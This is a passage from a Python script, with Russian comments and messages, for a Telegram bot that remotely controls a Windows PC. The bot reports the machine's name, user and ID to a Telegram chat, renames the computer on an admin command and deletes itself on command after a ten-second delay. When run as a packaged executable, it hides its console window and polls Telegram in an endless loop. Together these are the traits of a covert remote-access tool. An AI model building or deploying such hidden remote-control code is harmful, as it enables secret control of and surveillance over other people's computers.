        bot.answer_callback_query(call.id, f"📞 Владелец: {НОМЕР_ВЛАДЕЛЬЦА}")
    
    elif call.data == "info":
        info = f"🖥️ {PC_NAME}\n👤 {USER_NAME}\n🆔 {PC_ID}\n📞 {НОМЕР_ВЛАДЕЛЬЦА}"
        bot.answer_callback_query(call.id, info)
    
    # ===== УДАЛЕНИЕ =====
    elif call.data == "delete":
        bot.answer_callback_query(call.id, "💣 Удаление через 10 сек")
        
        def delayed_delete():
            time.sleep(10)
            if self_destruct():
                bot.send_message(call.message.chat.id, "✅ Программа удалена")
        
        threading.Thread(target=delayed_delete, daemon=True).start()

@bot.message_handler(commands=['rename'])
def rename_command(message):
    if message.from_user.id != ADMIN_ID:
        bot.reply_to(message, f"❌ Нет доступа. Владелец: {НОМЕР_ВЛАДЕЛЬЦА}")
        return
    
    parts = message.text.split()
    if len(parts) != 2:
        bot.reply_to(message, "📝 Использование: /rename [НОВОЕ_ИМЯ]")
        return
    
    new_name = parts[1].upper()
    if set_computer_name_temp(new_name):
        bot.reply_to(message, f"✅ Имя изменено на {new_name}!")
    else:
        bot.reply_to(message, "❌ Ошибка")

# ========== ЗАПУСК ==========
if __name__ == "__main__":
    print("=" * 50)
    print("🔥 МЕГА-БОТ ЗАПУЩЕН")
    print("=" * 50)
    print(f"🖥️ ПК: {PC_NAME}")
    print(f"🆔 ID: {PC_ID}")
    print(f"📞 Владелец: {НОМЕР_ВЛАДЕЛЬЦА}")
    print(f"✅ Все функции активны!")
    print("=" * 50)
    
    if getattr(sys, 'frozen', False):
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    
    while True:
        try:
            bot.polling(none_stop=True, interval=0)
        except Exception as e:
            print(f"Ошибка: {e}")
            time.sleep(5)